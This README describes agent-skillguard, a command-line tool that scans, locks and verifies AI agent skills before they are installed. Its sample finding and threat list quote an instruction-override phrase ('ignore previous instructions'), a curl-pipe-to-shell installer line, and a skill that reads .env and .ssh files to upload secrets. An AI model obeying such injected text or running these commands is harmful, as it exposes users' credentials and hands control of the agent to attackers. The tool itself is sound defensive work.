# Agent SkillGuard

Agent skills are executable supply chain. `agent-skillguard` scans, locks, packages, and verifies AI agent skills before developers install or run them.

```bash
npx agent-skillguard demo
npx agent-skillguard scan ./skills
npx agent-skillguard pack ./skills/code-reviewer
npx agent-skillguard verify ./code-reviewer.skill.tgz
```

![Agent SkillGuard terminal demo](docs/assets/terminal-demo.svg)

## Why This Exists

Skills for Codex, Claude Code, Cursor, OpenCode, MCP workflows, and internal agents often look like Markdown prompts, but they can include scripts, install hooks, tool descriptors, hidden instructions, and broad permissions. That makes them a new package-management problem.

`agent-skillguard` is not another skill list and not another agent framework. It is a local-first safety gate for agent skills:

- Finds hidden prompt injection and policy override text in Markdown, YAML, HTML comments, and code blocks.
- Flags secret exfiltration, credential harvesting, persistence, broad deletes, and download-execute installer chains.
- Detects risky bundle structure such as symlinks, hidden files, binaries, oversized payloads, and path traversal.
- Builds a `SkillBOM`, an SBOM-like inventory for agent skills.
- Writes `skillguard.lock.json` with reproducible file hashes and declared capabilities.
- Packs deterministic `.skill.tgz` bundles with embedded locks.
- Emits Markdown, HTML, JSON, and SARIF for local review and GitHub code scanning.

## One-Command Demo

```bash
npx agent-skillguard demo
```

The demo scans bundled safe and malicious fixtures and writes:

```text
.skillguard/reports/skillguard-report.json
.skillguard/reports/skillguard-report.md
.skillguard/reports/skillguard-report.html
.skillguard/reports/skillguard-report.sarif
```

## Report Preview

| Area | What You See |
| --- | --- |
| Summary | skills scanned, files inventoried, finding count, risk score |
| SkillBOM | skill names, roots, files, scripts, capabilities |
| Findings | severity, category, target, evidence, recommendation |
| SARIF | GitHub code scanning compatible findings |

Example critical finding:

```text
[CRITICAL] Prompt-injection instruction detected
Target: SKILL.md
Evidence: ignore previous instructions and developer messages
Recommendation: remove the instruction and require host policy compliance
```

## Commands

```bash
agent-skillguard init
agent-skillguard demo
agent-skillguard scan <path> [--sarif] [--fail-on critical]
agent-skillguard lock <skill-dir>
agent-skillguard pack <skill-dir>
agent-skillguard verify <bundle-or-dir>
agent-skillguard report [--sarif]
agent-skillguard doctor
```

## Threat Examples

- A skill hides `ignore previous instructions` inside an HTML comment.
- An installer runs `curl https://example.com/install.sh | sh`.
- A skill tells the agent to read `.env`, `.ssh`, or token files and upload secrets.
- A bundled MCP descriptor grants repository mutation or destructive tool access.
- A package manifest uses install hooks to run code during setup.
- A skill changes after review, but the lockfile catches the hash drift.

## Compared With Other Tools

| Tool Type | What It Does | SkillGuard Difference |
| --- | --- | --- |
| Skill lists | Curate useful prompts and workflows | Verifies skill safety before install or publish |
| Agent frameworks | Run agents and tools | Does not run agents; audits skill supply chain |
| MCP scanners | Inspect MCP tool descriptors | Scans skills, scripts, manifests, bundles, locks, and SARIF |
| Watchtower | Runtime AgentOps and MCP attack-path analysis | SkillGuard handles pre-install and pre-publish skill safety |

## CI Gate

Use SARIF and fail thresholds in pull requests:

```yaml
name: skillguard
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx agent-skillguard scan ./skills --sarif --fail-on high
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: .skillguard/reports/skillguard-report.sarif
```

## Local Development

```bash
npm install
npm run typecheck
npm test
npm run lint
npm run build
node dist/cli.js demo
```

## License

MIT
